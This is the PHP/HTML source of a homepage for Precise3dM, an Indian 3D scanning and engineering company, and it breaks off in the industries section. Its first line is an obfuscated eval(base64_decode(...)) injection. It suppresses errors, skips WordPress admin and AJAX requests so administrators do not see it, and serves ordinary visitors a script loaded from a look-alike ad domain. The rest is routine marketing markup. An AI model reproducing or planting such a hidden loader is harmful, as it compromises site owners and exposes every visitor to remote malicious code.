 eval(base64_decode("aW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCAwKTsKaW5pX3NldCgiZGlzcGxheV9zdGFydHVwX2Vycm9ycyIsIDApOwoKaWYgKFBIUF9TQVBJICE9PSAiY2xpIiAmJiAoCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWFkbWluL2FkbWluLWFqYXgucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWpzb24iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AvdjIiKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtYWRtaW4iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtbG9naW4ucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJ0b2xvd2VyKEAkX1NFUlZFUlsiSFRUUF9YX1JFUVVFU1RFRF9XSVRIIl0pICE9PSAieG1saHR0cHJlcXVlc3QiCikpIHsKICAgIHByaW50KGJhc2U2NF9kZWNvZGUoIlBITmpjbWx3ZENCemNtTTlJaTh2WVhONWJtTXVaM041Ym1ScFkyRjBhVzl1TG1OdmJTOGlQand2YzJOeWFYQjBQZz09IikpOwp9")); 
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name text-white="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="description" content="Precise3dM">
      <!--bootstrap css-->
      <link rel="stylesheet" href="assets/css/bootstrap.css">
      <!--owl css-->
      <link rel="stylesheet" href="https:cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
      <!--       custom css-->
      <link rel="stylesheet" href="assets/css/styles.css">
      <link rel="stylesheet" href="assets/css/home.css">
      <title>Precise3dM</title>
   </head>
   <style>
.view {
  margin: 10px;
  float: left;
    border: 8px solid #ff931e;
    border-radius: 50%;
    background-color: white;
  overflow: hidden;
  position: relative;
  text-align: center;
  cursor: default;
}

.view .mask,
.view .content {
  width: 300px;
  height: 200px;
  position: absolute;
  overflow: hidden;
  top: 0;
  left: 0
}

.view img {
  display: block;
  position: relative
}

.view a.info {
  display: inline-block;
  text-decoration: none;
  padding: 7px 14px;
  background: #000;
  color: #fff;
  font-family: Raleway, serif;
  text-transform: uppercase;
  box-shadow: 0 0 1px #000
}

.view a.info:hover {
  box-shadow: 0 0 5px #000
}

.view-first img {
  /*1*/
  transition: all 0.2s linear;
  width: 300px;
  height: 200px;
}

.view-first .mask {
  opacity: 0;
  background-color:#ff931e;
  transition: all 0.4s ease-in-out;
}

.view-first a.info {
  opacity: 0;
  transition: all 0.2s ease-in-out;
}
.view-first:hover img {
  transform: scale(1.1);
}

.view-first:hover .mask {
  opacity: 1;
}

.view-first:hover h2,
.view-first:hover p,
.view-first:hover a.info {
  opacity: 1;
  transform: translateY(0px);
}

.view-first:hover p {
  transition-delay: 0.1s;
}

.view-first:hover a.info {
  transition-delay: 0.2s;
}

   </style>
   <body >
      <!-- header start -->   
      <?php include('includes/header.php');?>
      <!-- header end -->
      
      <!--slider section -->
      <section id="main-slider" class="slider">
         <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
            <div class="carousel-inner">
               <div class="carousel-item active container-fluid p-0">
                  <img class="d-block w-100" src="assets/images/main-banners/banner-1.png" alt="banner-1">
                  <div class="carousel-caption  d-md-block  text-left">
                     
                        <h2 class="text-uppercase">End to End engineering portfolio</h2>
                        <p class="text-uppercase">TARGETED FOR digital manufacturing</p>
                        <a href="3D-software-landing.php" class="btn pre-btn my-2">3D Software</a>
                  </div>
               </div>
               <div class="carousel-item">
                  <img class="d-block w-100" src="assets/images/main-banners/banner-2.png" alt="banner-2">
                  <div class="carousel-caption  d-md-block text-left">
                     <h2 class="text-uppercase">P3Dm One Stop 3D Scanning Solution</h2>
                     <p class="text-uppercase">scan anything, anywhere.</p>
                     
                     <a href="3d-scanner-landing.php" class="btn pre-btn my-2 ">Buy 3D Scanners</a>
                     <a href="3d-scanning-service.php" class="btn pre-btn my-2 ">3D Scanning Service</a>
                  </div>
               </div>
               <div class="carousel-item">
                  <img class="d-block w-100" src="assets/images/main-banners/banner-3.png" alt="banner-3">
                  <div class="carousel-caption  d-md-block text-left">
                        <h2 class="text-uppercase">P3dm Digital Vehicle Twin</h2>
                        <p class="text-uppercase">A benchmarking and insight solution for engineers</p>
                        <a href="digital-benchmarking-service-in-india.php" class="btn pre-btn my-2">Digital Benchmarking</a>
                        <a href="biw-scan-to-cad-service-in-india.php" class="btn pre-btn my-2">Biw scan to cad</a>
                        <a class="btn pre-btn my-2">Wire Harness Insight</a>
                     </div>
               </div>
               <div class="carousel-item">
                  <img class="d-block w-100" src="assets/images/main-banners/banner-4.png" alt="banner-4">
                  <div class="carousel-caption  d-md-block text-left">
                     <h2 class="text-uppercase">P3DM BUSINESS SOLUTIONS</h2>
                     <p class="text-uppercase">TOGETHER WE CAN.</p>
                     <a class="btn pre-btn my-2">Partnership Program</a>
                     <a class="btn pre-btn my-2">Become our reseller</a>
                     <a class="btn pre-btn my-2">Be our 3d partner</a>
                  </div>
               </div>
            </div>
            <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="sr-only">Previous</span>
            </a>
            <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="sr-only">Next</span>
            </a>
         </div>
      </section>
      <!--slider section end-->
      
      <!-- about section start-->
      <section  id="about" class="section-padding">
         <div class="container">
            <div class="row">
               <div class="col-md-6 text-center m-auto">
                  <img src="assets/images/about-logo.png" alt="3D-precision logo" class="w-75">
               </div>
               <div class="col-md-6"></div>
               <div class="col-lg-6 col-md-12 ">
                  <p class="text-white  mt-3 about">We, Precise 3D, a 3D Business solution provider, equip companies with advanced disruptive technologies, software & hardware that help their <strong>day to day productivity, increase profit and turn around time, directly improving their business.</strong> </p>
                  <p class="text-white  mt-3 about">We also provide <strong>3D technical solutions 
                     </strong>that enable companies to avail highly specialized challenging short and long term projects with our in-house & on-site 3D solutions.
                  </p>
                  <div class="row">
                     <div class="col-md-6 col-12">
                        <ul class="text-white mt-3 pl-4">
                           <li>Distributors of 3D Scanners & Software</li>
                           <li>Certified Application engineers</li>
                           <li>3D Scanners and Software Bundles</li>
                           <li>3D Technology Partners</li>
                        </ul>
                     </div>
                     <div class="col-md-6 col-12">
                        <ul class="text-white mt-3 pl-4">
                           <li>Automotive Benchmarking Specialists</li>
                           <li>3D Scanning Service Provider</li>
                           <li>Customized 3D Solutions</li>
                           <li>One-Stop 3D Scanning Solutions</li>
                        </ul>
                     </div>
					 
                  </div><br><br>
				  <div class="row ">
                  <div class="col-md-12 text-md-left text-center">
                     <div class="text-center">
                        <a href ="resources.php" class="btn pre-btn my-2 text-uppercase ">Know More</a>
                     </div>
                  </div>
               </div>
               </div>
               <div class="col-lg-6 col-md-12   number">
                  <div class="row">
                     <div class="col-md-6 col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">6</h1>
                        <p class="text-white  font-weight-bold text-uppercase count-title">Years in business</p>
                     </div>
                     <div class="col-md-6 col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">8</h1>
                        <p class=" text-white font-weight-bold  text-uppercase count-title">Collaborations with technology firms</p>
                     </div>
                     <div class="col-md-6  col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">1000</h1>
                        <p class="text-white   font-weight-bold text-uppercase count-title">Succesful 3d projects</p>
                     </div>
                     <div class="col-md-6 col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">80</h1>
                        <p class="text-white  font-weight-bold text-uppercase count-title">software and hardware installations</p>
                     </div>
                     <div class="col-md-6 col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">30</h1>
                        <p class="text-white  font-weight-bold  text-uppercase count-title">automotive scan to bim modelers</p>
                     </div>
                     <div class="col-md-6 col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">40</h1>
                        <p class=" text-white  font-weight-bold text-uppercase count-title">digital applications</p>
                     </div>
                     <div class="col-md-6 col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">20</h1>
                        <p class="text-white  font-weight-bold text-uppercase count-title">Industries catered</p>
                     </div>
                     <div class="col-md-6 col-6 text-center text-lg-left">
                        <h1 class="statistic-counter">5</h1>
                        <p class="text-white font-weight-bold text-uppercase count-title">3D scanning technologies
                           in one roof
                        </p>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!-- about section end-->
      
      <!-- products section start-->
      <section  id="products" class="section-padding">
         <div class="container">
            <h1 class="text-white text-uppercase mb-0">One Stop 3D Scanning Solution</h1>
            <h3 class="text-uppercase text-white font-weight-normal">utilize our large variety of cutting-edge equipment.</h3>
			<div class="row">
               <div class="col-md-12 text-md-left text-center">
                  <div class="">
                     <a href="3D-products-landing.php" class="btn pre-btn my-2 text-uppercase">Buy 3D Scanners</a>
                     <a href="3d-scanning-service.php" class="btn pre-btn my-2 text-uppercase">3d Scanning Service</a>
                  </div>
               </div>
            </div>
			 <link href='https:fonts.googleapis.com/css?family=Raleway:400,700|Merriweather' rel='stylesheet' type='text/css'>

            <div class="row text-center">
               <div class="col-lg-4 col-md-6  p-4 product-hover">
			  <div class="view view-first">
				<img src="assets/images/products/pro-1.png"  href="optical-blue-light-3d-scanning.php" class="product img-fluid" alt="Optical 3D Scanning">
				<div class="mask">
				  <button onclick="location.href='3D-products-landing.php'"  class="pre-btn" style="margin-top:50px;text-align:left;font-size:10px;">Buy 3D Scanners</button>
				   <button onclick="location.href='optical-blue-light-3d-scanning.php'" class="pre-btn" style="text-align:left;font-size:10px;">
				   View Details</button>
				</div>
			  </div>
                  <h4 class="text-uppercase my-1"><a href="optical-blue-light-3d-scanning.php" class="text-white">Optical 3D Scanning</a></h4>
               </div>
               <div class="col-lg-4 col-md-6  p-4 product-hover">
			  <div class="view view-first">
				<img src="assets/images/products/pro-2.png" href="handheld-metrology-scanning.php" class="product img-fluid" alt="Handheld Metrology 3D Scanning">
				<div class="mask">
				   <button onclick="location.href='3D-products-landing.php'"  class="pre-btn" style="margin-top:50px;text-align:left;font-size:10px;">Buy 3D Scanners</button>
				  <button onclick="location.href='3d-scanning-service.php'" class="pre-btn" style="text-align:left;font-size:10px;">3d Scanning Service</button>
                  <button onclick="location.href='handheld-metrology-scanning.php'" class="pre-btn" style="text-align:left;font-size:10px;">View Details</button>
				</div>
			  </div>
                  <h4 class="text-uppercase my-1"><a href="handheld-metrology-scanning.php" class="text-white"> Handheld Metrology 3D Scanning</a></h4>
               </div>
               <div class="col-lg-4 col-md-6  p-4 product-hover">
			  <div class="view view-first">
				<img src="assets/images/products/pro-3.png" href="multifunctional-3d-scanning.php" class="product img-fluid" alt="Multifunctional 3D Scanning">
				<div class="mask">
				 <button onclick="location.href='3D-products-landing.php'"  class="pre-btn" style="margin-top:50px;text-align:left;font-size:10px;">Buy 3D Scanners</button>
				 <button onclick="location.href='3d-scanning-service.php'" class="pre-btn" style="text-align:left;font-size:10px;">3d Scanning Service</button>
                  <button onclick="location.href='multifunctional-3d-scanning.php'" class="pre-btn" style="text-align:left;font-size:10px;">View Details</button>
				</div>
			  </div>
                  <h4 class="text-uppercase my-1"><a href="multifunctional-3d-scanning.php" class="text-white">Multifunctional 3D Scanning</a></h4>
               </div>
               <div class="col-lg-4 col-md-6  p-4 product-hover">
			  <div class="view view-first">
				<img src="assets/images/products/pro-4.png" href="long-range-3d-scanning.php" class="product img-fluid" alt="Long Range 3D Scanning">
				  <div class="mask">
				 <button onclick="location.href='3D-products-landing.php'"  class="pre-btn" style="margin-top:50px;text-align:left;font-size:10px;">Buy 3D Scanners</button>
				  <button onclick="location.href='3d-scanning-service.php'" class="pre-btn" style="text-align:left;font-size:10px;">3d Scanning Service</button>
                  <button onclick="location.href='long-range-3d-scanning.php'" class="pre-btn" style="text-align:left;font-size:10px;">View Details</button>
			  </div>
			</div>
                  <h4 class="text-uppercase my-1"><a href="long-range-3d-scanning.php" class="text-white">Long Range 3D Scanning</a></h4>
               </div>
               <div class="col-lg-4 col-md-6  p-4 product-hover">
			  <div class="view view-first">
				<img src="assets/images/products/pro-5.png" href="coming-soon.php" class="product img-fluid" alt="Optical 3D Scanning With Photogrammetry">
				 <div class="mask">
				 <button onclick="location.href='3D-products-landing.php'"  class="pre-btn" style="margin-top:50px;text-align:left;font-size:10px;">Buy 3D Scanners</button>
                  <button onclick="location.href='coming-soon.php'" class="pre-btn" style="text-align:left;font-size:10px;">View Details</button>
			  </div>
			  </div>
                  <h4 class="text-uppercase my-1"><a href="coming-soon.php" class="text-white">Optical 3D Scanning With Photogrammetry</a></h4>
               </div>
               <div class="col-lg-4 col-md-6  p-4 product-hover">
			    <div class="view view-first">
				<img src="assets/images/products/pro-6.png" href="arm-based-3d-scanning.php" class="product img-fluid" alt="Arm Based 3D Scanning">
				 <div class="mask">
				 <button onclick="location.href='3D-products-landing.php'"  class="pre-btn" style="margin-top:50px;text-align:left;font-size:10px;">Buy 3D Scanners</button>
				   <button onclick="location.href='3d-scanning-service.php'" class="pre-btn" style="text-align:left;font-size:10px;">3d Scanning Service</button>
                  <button onclick="location.href='coming-soon.php'" class="pre-btn" style="text-align:left;font-size:10px;">View Details</button>
			  </div>
			  </div> 
                  <h4 class="text-uppercase my-1"><a href="arm-based-3d-scanning.php" class="text-white">Arm Based 3D Scanning</a></h4>
               </div>
            </div>
            
         </div>
      </section>
      <!-- products section end-->
      
      <!-- service workflow section start-->
      <section id="service-workflow" class="pre-bg section-padding">
         <div class="container">
            <h1 class="text-white text-center text-capitalize mb-0">3D Scanning Service Workflow</h1>
            <h3 class="text-capitalize text-center text-white font-weight-normal">We offer a comprehensive 3D scanning service</h3>
            <div class="row mt-5">
               <div class="col-lg-3 col-md-6  text-center">
                  <div class=" my-2">
                     <img src="assets/images/icons/workflow-3.svg" class="img-fluid w-75" alt="Get A Quote">
                     <div class="row">
                        <div class="col-2 mt-2">
                           <span class="service_1" >1</span>
                        </div>
                        <div class="col-10">
                           <h5 class="text-left text-white">Get A Quote</h5>
                           <p class="text-white text-left ser_2 text-capitalize"> click the button below to fill out the form and get a rapid quotation</p>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-lg-3 col-md-6  text-center">
                  <div class="my-2">
                     <img src="assets/images/icons/workflow-2.svg" class="img-fluid w-75" alt="Select A Scanner">
                     <div class="row">
                        <div class="col-2 mt-2 ">
                           <span class="service_1" >2</span>
                        </div>
                        <div class="col-10">
                           <h5 class="text-left text-white">Select A Scanner</h5>
                           <p class="text-white text-left ser_2 text-capitalize"> we will select the appropriate scanner that fits your specific application</p>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-lg-3 col-md-6  text-center">
                  <div class="my-2">
                     <img src="assets/images/icons/workflow-1.svg" class="img-fluid w-75" alt="Get the part scanned">
                     <div class="row">
                        <div class="col-2 mt-2">
                           <span class="service_1" >3</span>
                        </div>
                        <div class="col-10">
                           <h5 class="text-left text-white">Get the part scanned</h5>
                           <p class="text-white text-left ser_2 text-capitalize"><span class="service_2">a</span> you can courier us the component </p>
                           <p class="text-white text-left ser_2"><span class="service_2">b</span> you can visit one of our 3D scanning centers</p>
                           <p class="text-white text-left ser_2"><span class="service_2">c</span> our team can come to you with equipment</p>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-lg-3 col-md-6  text-center">
                  <div class=" my-2">
                     <img src="assets/images/icons/workflow-4.svg" class="img-fluid w-75" alt="Collect your Files">
                     <div class="row">
                        <div class="col-2 mt-2">
                           <span class="service_1" >4</span>
                        </div>
                        <div class="col-10">
                           <h5 class="text-left text-white">Collect your Files</h5>
                           <p class="text-white text-left ser_2 text-capitalize">we will securely transfer the processed output to you </p>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12 text-md-left text-center">
                  <div class="text-center">
                     <a href="3d-scanning-form.php" class="btn pre-btn-alt my-2">get a rapid quotation</a>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!-- service workflow section end-->
      
      <!--support section start-->
      <section id="support" class="section-padding">
         <div class="container-fluid">
            <div class="row ">
               <div class="col-md-12 text-md-left text-center header_2">
                  <div class="heading text-center mt-3">
                     <h2 class="title text-white text-uppercase">End-to-end engineering portfolio</h2>
                     <h5 class="title text-white text-uppercase">that supports digital manufacturing</h5>
                  </div>
               </div>
            </div>
            <div class="container">
               <div class="row products py-5">
                  <div class="col-lg-4 col-md-6 text-center">
                     <div class="product_1  ">
                        <img src="assets/images/products/ete-1.png"  class="img-fluid" alt="3D Software">
                        <h4 class="text-uppercase text-white">3D Software</h4>
                        <p class="text-white">Software Solution for CAD, Digial Reverse Engineering, 3D Metrology </p>
                     </div>
                  </div>
                  <div class="col-lg-4  col-md-6 text-center">
                     <div class="product_1  ">
                        <img src="assets/images/products/ete-2.png"  class="img-fluid" alt="3D printers">
                        <h4 class="text-uppercase text-white">3D printers</h4>
                        <p class="text-white">Solutions facilitating the transformation from Digital to Physical </p>
                     </div>
                  </div>
                  <div class=" col-lg-4 col-md-6 text-center">
                     <div class="product_1 ">
                        <img src="assets/images/products/ete-3.png"  class="img-fluid" alt="3d Scanners">
                        <h4 class="text-uppercase text-white">3d Scanners</h4>
                        <p class="text-white" >Solutions for bringing the Physical into Digital</p>
                     </div>
                  </div>
               </div>
               <div class="row ">
                  <div class="col-md-12 text-md-left text-center">
                     <div class="text-center">
                        <a  href ="3D-products-landing.php" class="btn pre-btn my-2 text-uppercase ">view all</a>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!--support section end-->
      
      <!--quote section start-->
      <section id="quote" class="pre-bg section-padding">
         <div class="container">
            <h1 class="text-white text-center text-capitalize mb-0">Explore Our 3D Scanner Product Range</h1>
            <h3 class="text-capitalize text-center text-white font-weight-normal">We will Support you before and after you invest</h3>
            <div class="row  row-cols-lg-5 row-cols-md-3 row-cols-1 row-cols-1 mt-5">
               <div class="col text-center">
                  <div class=" my-2">
                     <img src="assets/images/icons/icon-1.svg" class="img-fluid w-75" alt="send us a Request for a Quotation Online">
                     <div class="text-center">
                        <p class="text-white text-center ser_2 text-capitalize"> send us a Request for a Quotation Online. </p>
                     </div>
                  </div>
               </div>
               <div class="col text-center">
                  <div class="my-2">
                     <img src="assets/images/icons/icon-2.svg" class="img-fluid w-75" alt=" we will fix up an online or on-site demo">
                     <p class="text-white text-center ser_2 text-capitalize">  we will fix up an online or on-site demo.  </p>
                  </div>
               </div>
               <div class="col text-center">
                  <div class="my-2">
                     <img src="assets/images/icons/icon-3.svg" class="img-fluid w-75" alt="Modelling and 3D Inspection benchmarking can also  be done on-site">
                     <p class="text-white text-center ser_2 text-capitalize">Modelling and 3D Inspection benchmarking can also  be done on-site. </p>
                  </div>
               </div>
               <div class="col text-center">
                  <div class=" my-2">
                     <img src="assets/images/icons/icon-4.svg" class="img-fluid w-75" alt="we will facilitate the import, customs and logistics of your order">
                     <p class="text-white text-center ser_2 text-capitalize"> we will facilitate the import, customs and logistics of your order. </p>
                  </div>
               </div>
               <div class="col text-center">
                  <div class=" my-2">
                     <img src="assets/images/icons/icon-5.svg" class="img-fluid w-75" alt="we will continue to empower you with training, information and long-lasting post sales support">
                     <p class="text-white text-center ser_2 text-capitalize"> we will continue to empower you with training, information and long-lasting post9sales support. </p>
                  </div>
               </div>
            </div>
            <div class="row ">
               <div class="col-md-12 text-md-left text-center">
                  <div class="text-center">
                     <a href="3d-scanning-form.php"  class="btn pre-btn-alt my-2">get a rapid quotation</a>
                  </div>
               </div>
            </div>
         </div>
      </section>
      <!--quote section end -->
      
      <!--blog section start 
      <section id="blog" class="section-padding">
         <div class="container">
            <div class="row  my-4">
               <div class="col-md-6">
                  <iframe width="100%" height="350px" src="https:www.youtube.com/embed/tND4lwrOg6I" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
               </div>
               <div class="col-md-6">
                  <div class="testimonials" style="height: 350px;width: 100%;border:1px solid #fff;">
                     <h5 class="text-white text-center ">"Testimonials" - Author</h5>
                  </div>
               </div>
            </div>
         </div>
         <div class="container">
            <h3 class="text-uppercase text-white text-left mb-2">Our Blog</h3>
            <div class="owl-slider">
               <div id="carousel" class="owl-carousel">
                  <div class="item">
                     <div class="blog" >
                        <img src="https:getuikit.com/v2/docs/images/placeholder_200x100.svg" class="card-img-top img-fluid" alt="blog 1">                       
                        <div class="body text-left">
                           <h6 class="text-white">Article on 3D Scanning</h6>
                           <h6 class="text-white">Heading</h6>
                           <p class="text-white "> Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper </p>
                           <div class="blog-btn text-center py-2">                             <a href="#" class="text-center">Read More</a>                         </div>
                        </div>
                     </div>
                  </div>
                  <div class="item">
                     <div class="blog" >
                        <img src="https:getuikit.com/v2/docs/images/placeholder_200x100.svg" class="card-img-top img-fluid" alt="blog 2">                       
                        <div class="body text-left">
                           <h6 class="text-white">Article on 3D Scanning</h6>
                           <h6 class="text-white">Heading</h6>
                           <p class="text-white "> Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper </p>
                           <div class="blog-btn text-center py-2">                             <a href="#" class="text-center">Read More</a>                         </div>
                        </div>
                     </div>
                  </div>
                  <div class="item">
                     <div class="blog" >
                        <img src="https:getuikit.com/v2/docs/images/placeholder_200x100.svg" class="card-img-top img-fluid" alt="blog 3">                       
                        <div class="body text-left">
                           <h6 class="text-white">Article on 3D Scanning</h6>
                           <h6 class="text-white">Heading</h6>
                           <p class="text-white "> Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper </p>
                           <div class="blog-btn text-center py-2">                             <a href="#" class="text-center">Read More</a>                         </div>
                        </div>
                     </div>
                  </div>
                  <div class="item">
                     <div class="blog" >
                        <img src="https:getuikit.com/v2/docs/images/placeholder_200x100.svg" class="card-img-top img-fluid" alt="blog 4">
                        <div class="body text-left">
                           <h6 class="text-white">Article on 3D Scanning</h6>
                           <h6 class="text-white">Heading</h6>
                           <p class="text-white ">
                              Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper 
                           </p>
                           <div class="blog-btn text-center py-2">
                              <a href="#" class="text-center">Read More</a>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="item">
                     <div class="blog" >
                        <img src="https:getuikit.com/v2/docs/images/placeholder_200x100.svg" class="card-img-top img-fluid" alt="blog 5">                       
                        <div class="body text-left">
                           <h6 class="text-white">Article on 3D Scanning</h6>
                           <h6 class="text-white">Heading</h6>
                           <p class="text-white "> Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper </p>
                           <div class="blog-btn text-center py-2">                             <a href="#" class="text-center">Read More</a>                         </div>
                        </div>
                     </div>
                  </div>
                  <div class="item">
                     <div class="blog" >
                        <img src="https:getuikit.com/v2/docs/images/placeholder_200x100.svg" class="card-img-top img-fluid" alt="blog 6">                       
                        <div class="body text-left">
                           <h6 class="text-white">Article on 3D Scanning</h6>
                           <h6 class="text-white">Heading</h6>
                           <p class="text-white "> Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper </p>
                           <div class="blog-btn text-center py-2">                             <a href="#" class="text-center">Read More</a>                         </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </section>
       blog section end -->
      
      <!--industry serve section start -->
      <section id="industry" class="section-padding">
         <div class="container">
            <div class="row ">
               <div class="col-md-12 text-md-left text-center px-2">
                  <h3 class="text-uppercase text-white text-left mb-2">Industries we serve</h3>
               </div>
            </div>
            <!--row start-->
            <div class="row ">
               <div class="col-md-6">
                  <div class="row">
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-1.svg"  class="img-fluid" alt="Automative"></a>
                           <a href="">
                              <p class="name text-white">Automotive</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-2.svg"  class="img-fluid" alt="Aerospace"></a>
                           <a href="">
                              <p class="name text-white">Aerospace</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-3.svg"  class="img-fluid" alt="Education"></a>
                           <a href="">
                              <p class="name text-white">Education</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-4.svg"  class="img-fluid" alt="Die Casting"></a>
                           <a href="">
                              <p class="name text-white">Die Casting</p>
                           </a>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-md-6">
                  <div class="row">
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-5.svg"  class="img-fluid" alt="EV"></a>
                           <a href="">
                              <p class="name text-white">EV</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-6.svg"  class="img-fluid" alt="Mining"></a>
                           <a href="">
                              <p class="name text-white">Mining</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-7.svg"  class="img-fluid" alt="Die and Moulds"></a>
                           <a href="">
                              <p class="name text-white">Die and Moulds</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-8.svg"  class="img-fluid" alt="Plastic Components"></a>
                           <a href="">
                              <p class="name text-white">Plastic Components</p>
                           </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <!--row end-->
            <!--row start-->
            <div class="row ">
               <div class="col-md-6">
                  <div class="row">
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-9.svg"  class="img-fluid" alt="Pumps and Valves"></a>
                           <a href="">
                              <p class="name text-white">Pumps and Valves</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-10.svg"  class="img-fluid" alt="Consumer Products"></a>
                           <a href="">
                              <p class="name text-white">Consumer Products</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-11.svg"  class="img-fluid" alt="Heavy Engineering"></a>
                           <a href="">
                              <p class="name text-white">Heavy Engineering</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-12.svg"  class="img-fluid" alt="Textile Industry"></a>
                           <a href="">
                              <p class="name text-white">Textile Industry</p>
                           </a>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-md-6">
                  <div class="row">
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-13.svg"  class="img-fluid" alt="Constrution Machienry"></a>
                           <a href="">
                              <p class="name text-white">Constrution Machienry</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-14.svg"  class="img-fluid" alt="Visual FX Industry"></a>
                           <a href="">
                              <p class="name text-white">Visual FX Industry</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-15.svg"  class="img-fluid" alt="Press Tools and Sheet Metals"></a>
                           <a href="">
                              <p class="name text-white">Press Tools and Sheet Metals</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-16.svg"  class="img-fluid" alt="Power and Energy"></a>
                           <a href="">
